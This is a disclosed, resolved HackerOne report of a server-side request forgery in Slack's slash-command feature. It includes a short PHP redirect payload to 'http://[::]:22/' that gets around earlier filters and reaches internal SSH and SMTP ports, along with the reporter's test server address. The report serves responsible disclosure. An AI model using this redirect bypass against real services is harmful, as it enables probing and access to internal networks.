# [M] SSRF in api.slack.com, using slash commands and bypassing the protections.

## Summary
Severity: Medium
Program: Slack
Weakness: Server-Side Request Forgery (SSRF)
Reporter: elber
State: resolved
Disclosed: 2019-02-22T20:58:21.565Z
Source: https://hackerone.com/reports/381129

## Details
Bypassing the reports #61312 and #356765

**Tutorial:**


**Go to api.slack.com and create an application with your own slash command.**
{F320014}

**Enter your own domain:**
*in your own domain: index.php*

`<?php
header("location: http://[::]:22/");
?> `

location: http://[::]:22/

{F320019}

And save.

Go to your Slack and type /youslash


Try with my server http://206.189.204.187/


Results:

SSH
{F320015}

SMNTP
{F320016}

## Impact

In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources, and scan for internal ports and get the versions of the services running on the server.

_Trimmed to 38 lines — full report: https://hackerone.com/reports/381129_
